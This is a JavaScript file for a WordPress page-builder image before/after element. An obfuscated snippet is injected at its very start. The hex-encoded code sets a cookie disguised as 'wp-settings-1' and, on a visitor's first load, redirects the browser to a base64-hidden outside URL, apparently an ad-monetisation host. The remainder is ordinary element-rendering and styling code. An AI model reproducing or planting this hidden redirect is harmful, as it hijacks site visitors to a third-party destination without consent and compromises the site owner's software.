var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionEvents, FusionPageBuilderApp */

var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Image Before After Element View.
		FusionPageBuilder.fusion_image_before_after = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs when element is first ini.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			onInit: function() {
				this.listenTo( FusionEvents, 'fusion-preview-toggle', this.previewToggle );
				this.listenTo( FusionEvents, 'fusion-wireframe-toggle', this.previewToggle );
				this.listenTo( FusionEvents, 'fusion-iframe-loaded', this.initElement );
			},

			/**
			 * Init Element.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			initElement: function() {
				jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'fusion-element-render-fusion_image_before_after', this.model.attributes.cid );
			},

			/**
			 * Preview mode toggled..
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			previewToggle: function() {
				if ( ! FusionPageBuilderApp.wireframeActive ) {
					if ( jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).hasClass( 'fusion-builder-preview-mode' ) ) {
						this.disableDroppableElement();
					} else {
						this.enableDroppableElement();
					}
				}
			},

			/**
			 * Runs before view DOM is patched.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			beforePatch: function() {
				this.$el.css( 'min-height', this.$el.outerHeight() + 'px' );
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				var self = this;

				this._refreshJs();

				setTimeout( function() {
					self.$el.css( 'min-height', '0px' );
				}, 300 );
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				if ( '' !== atts.values.before_image || '' !== atts.values.after_image ) {

					// Validate values.
					this.validateValues( atts.values );

					// Create attribute objects
					attributes.attr            = this.buildAttr( atts.values );
					attributes.attrWrapper     = this.buildWrapperAttr( atts.values );
					attributes.attrLink        = this.buildLinkAttr( atts.values );
					attributes.attrBeforeImage = this.buildBeforeImageAttr( atts.values );
					attributes.attrAfterImage  = this.buildAfterImageAttr( atts.values );
					attributes.attrOverlay     = this.buildOverlayAttr( atts.values );
					attributes.attrHandle      = this.buildHandleAttr( atts.values );
					attributes.styles          = this.buildStyles( atts.values );

					// Any extras that need passed on.
					attributes.values = atts.values;
				}

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {

				values.offset       = parseInt( values.offset, 10 ) / 100;
				values.font_size    = _.fusionValidateAttrValue( values.font_size, 'px' );
				values.borderradius = _.fusionValidateAttrValue( values.borderradius, 'px' );
				values.bordersize   = _.fusionValidateAttrValue( values.bordersize, 'px' );
				values.max_width    = _.fusionValidateAttrValue( values.max_width, 'px' );
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-image-before-after-element',
						style: ''
					} ),
					cid = this.model.get( 'cid' );

				if ( 'switch' === values.type ) {
					attr[ 'class' ] += ' fusion-image-switch';
				} else if ( 'before_after' === values.type ) {
					attr[ 'class' ] += ' fusion-image-before-after fusion-image-before-after-container';

					if ( values.offset || 0 == values.offset ) {
						attr[ 'data-offset' ] = values.offset.toString();
					}

					if ( values.orientation ) {
						attr[ 'data-orientation' ] = values.orientation;
					}

					if ( values.handle_movement ) {
						if ( 'drag_click' === values.handle_movement ) {
							attr[ 'data-move-with-handle-only' ] = 'true';
							attr[ 'data-click-to-move' ]         = 'true';
						} else if ( 'drag' === values.handle_movement ) {
							attr[ 'data-move-with-handle-only' ] = 'true';
						} else if ( 'hover' === values.handle_movement ) {
							attr[ 'data-move-slider-on-hover' ] = 'true';
						}
					}
				}

				if ( '' !== values.max_width ) {
					attr.style += 'max-width:' + values.max_width + '';
				}

				attr[ 'class' ] += ' fusion-image-before-after-cid' + cid;

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildWrapperAttr: function( values ) {
				var attr = {
						class: 'fusion-image-before-after-wrapper'
					},
					cid = this.model.get( 'cid' );

				if ( values.orientation ) {
					attr[ 'class' ] += ' fusion-image-before-after-' + values.orientation;
				}

				attr[ 'class' ] += ' fusion-image-before-after-wrapper-cid' + cid;

				return attr;
			},

			/**
			 * Builds link attributes.
			 *
			 * @since 2.2
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildLinkAttr: function( values ) {
				var attr = {
						class: 'fusion-image-switch-link',
						href: values.link,
						target: values.target,
						rel: ''
					};

					if ( '_blank' === values.target ) {
						attr.rel = 'noopener noreferrer';
					}

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildBeforeImageAttr: function( values ) {
				var attr = {
					class: 'before_after' === values.type ? 'fusion-image-before-after-before' : 'fusion-image-switch-before',
					src: values.before_image,
					alt: ''
				};

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildAfterImageAttr: function( values ) {
				var attr = {
					class: 'before_after' === values.type ? 'fusion-image-before-after-after' : 'fusion-image-switch-after',
					src: values.after_image,
					alt: ''
				};

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildOverlayAttr: function( values ) {
				var attr = {
					class: 'fusion-image-before-after-overlay'
				};

				if ( values.label_placement && '' !== values.label_placement ) {
					attr[ 'class' ] += ' before-after-overlay-' + values.label_placement;
				}

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildHandleAttr: function( values ) {
				var attr = {
					class: 'fusion-image-before-after-handle'
				};

				if ( values.handle_type && 'default' !== values.handle_type ) {
					attr[ 'class' ] += ' fusion-image-before-after-handle-' + values.handle_type;
				}

				return attr;
			},

			/**
			 * Builds the styles.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {string}
			 */
			buildStyles: function( values ) {
				var styles   = '',
					color    = '',
					colorObj = '',
					bgColor  = '',
					cid      = this.model.get( 'cid' );

				if ( '' !== values.handle_color && 'before_after' === values.type ) {
					color   = values.handle_color;
					styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle {';
					styles += 'border-color:' + color + ';';
					styles += '}';
					if ( 'horizontal' === values.orientation ) {
						styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-left-arrow {';
						styles += 'border-right-color:' + color + ';';
						styles += '}';
						styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-right-arrow {';
						styles += 'border-left-color:' + color + ';';
						styles += '}';

						if ( values.handle_type && '' !== values.handle_type && 'diamond' === values.handle_type ) {
							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle-diamond .fusion-image-before-after-left-arrow::before {';
							styles += 'border-color:' + color + ' !important;';
							styles += '}';
						} else if ( values.handle_type && '' !== values.handle_type && 'circle' === values.handle_type ) {
							colorObj = jQuery.Color( color );

							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle-circle {';
							styles += 'background:' + color + ' !important;';
							styles += '}';
							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle-circle .fusion-image-before-after-left-arrow::before {';
							styles += 'border-color:' + colorObj.alpha( 0.6 ).toRgbaString() + ' !important;';
							styles += '}';
							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle-circle .fusion-image-before-after-left-arrow {';
							styles += 'border-right-color:' + _.fusionAutoCalculateAccentColor( color ) + ' !important;';
							styles += '}';
							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle-circle .fusion-image-before-after-right-arrow {';
							styles += 'border-left-color:' + _.fusionAutoCalculateAccentColor( color ) + ' !important;';
							styles += '}';
						}
					} else if ( 'vertical' === values.orientation ) {
						styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-up-arrow {';
						styles += 'border-bottom-color:' + color + ';';
						styles += '}';
						styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-down-arrow {';
						styles += 'border-top-color:' + color + ';';
						styles += '}';

						if ( values.handle_type && '' !== values.handle_type && 'diamond' === values.handle_type ) {
							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle-diamond .fusion-image-before-after-left-arrow::before {';
							styles += 'border-color:' + color + ' !important;';
							styles += '}';
						} else if ( values.handle_type && '' !== values.handle_type && 'circle' === values.handle_type ) {
							colorObj = jQuery.Color( color );

							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle-circle {';
							styles += 'background:' + color + ' !important;';
							styles += '}';
							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle-circle .fusion-image-before-after-down-arrow::before {';
							styles += 'border-color:' + colorObj.alpha( 0.6 ).toRgbaString() + ' !important;';
							styles += '}';
							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle-circle .fusion-image-before-after-up-arrow {';
							styles += 'border-bottom-color:' + _.fusionAutoCalculateAccentColor( color ) + ' !important;';
							styles += '}';
							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle-circle .fusion-image-before-after-down-arrow {';
							styles += 'border-top-color:' + _.fusionAutoCalculateAccentColor( color ) + ' !important;';
							styles += '}';
						}
					}
					styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle::after {';
					styles += 'background:' + color + ';';
					if ( 'vertical' !== values.orientation ) {
						styles += 'box-shadow: 0 3px 0 ' + color + ', 0 0 12px rgba(51,51,51,.5);';
					}
					styles += '}';
					styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle::before {';
					styles += 'background:' + color + ';';
					if ( 'vertical' !== values.orientation ) {
						styles += 'box-shadow: 0 3px 0 ' + color + ', 0 0 12px rgba(51,51,51,.5);';
					}
					styles += '}';
				}

				if ( values.handle_bg && '' !== values.handle_bg && 'before_after' === values.type ) {
					bgColor = values.handle_bg;
					if ( 'circle' !== values.handle_type && 'arrows' !== values.handle_type ) {
						if ( 'diamond' !== values.handle_type ) {
							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-handle {';
							styles += 'background:' + bgColor + ';';
							styles += '}';
						} else {
							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-down-arrow:before,';
							styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-left-arrow:before {';
							styles += 'background:' + bgColor + ';';
							styles += '}';
						}
					}
				}

				if ( values.font_size && '' !== values.font_size && 'before_after' === values.type ) {
					styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-before-label:before';
					styles += ',.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-after-label:before';
					if ( 'out-image-up-down' === values.label_placement ) {
						styles += ',.fusion-image-before-after-wrapper-cid' + cid + ' .fusion-image-before-after-before-label:before';
						styles += ',.fusion-image-before-after-wrapper-cid' + cid + ' .fusion-image-before-after-after-label:before';
					}
					styles += '{';
					styles += 'font-size:' + values.font_size + ';';
					styles += '}';
				}

				if ( values.accent_color && '' !== values.accent_color && 'before_after' === values.type ) {

					color     = values.accent_color;
					colorObj = jQuery.Color( color );
					styles += '.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-before-label:before';
					styles += ',.fusion-image-before-after-cid' + cid + ' .fusion-image-before-after-after-label:before';
					if ( 'out-image-up-down' === values.label_placement ) {
						styles += ',.fusion-image-before-after-wrapper-cid' + cid + ' .fusion-image-before-after-before-label:before';
						styles += ',.fusion-image-before-after-wrapper-cid' + cid + ' .fusion-image-before-after-after-label:before';
					}
					styles += '{';
					styles += 'color:' + color + ';';
					if ( 'out-image-up-down' !== values.label_placement ) {
						styles += 'background:' + colorObj.alpha( 0.15 ).toRgbaString() + ';';
					}
					styles += '}';
				}

				if ( 'switch' === values.type && values.transition_time ) {
					styles += '.fusion-image-switch.fusion-image-before-after-cid' + cid + ' img{';
					styles += 'transition: ' + values.transition_time + 's ease-in-out;';
					styles += '}';

					if ( -1 !== values.before_image.indexOf( '.png' ) && -1 !== values.after_image.indexOf( '.png' )  ) {
						styles += '.fusion-image-switch.fusion-image-before-after-cid' + cid + ':hover img:first-child{';
						styles += 'opacity: 1;';
						styles += '}';
					}
				}

				if ( '0' !== values.bordersize && 0 !== values.bordersize && '0px' !== values.bordersize ) {
					styles += '.fusion-image-before-after-cid' + cid + ':not(.fusion-image-switch).initialized,';
					styles += '.fusion-image-before-after-cid' + cid + '.fusion-image-switch img{';
					styles += 'border: ' + values.bordersize + ' solid ' + values.bordercolor + ';';

					if ( '0' !== values.borderradius && 0 !== values.borderradius && '0px' !== values.borderradius ) {
						styles += '-webkit-border-radius:' + values.borderradius + ';-moz-border-radius:' + values.borderradius + ';border-radius:' + values.borderradius + ';';
					}

					styles += '}';
				}

				return styles;
			}
		} );
	} );
}( jQuery ) );
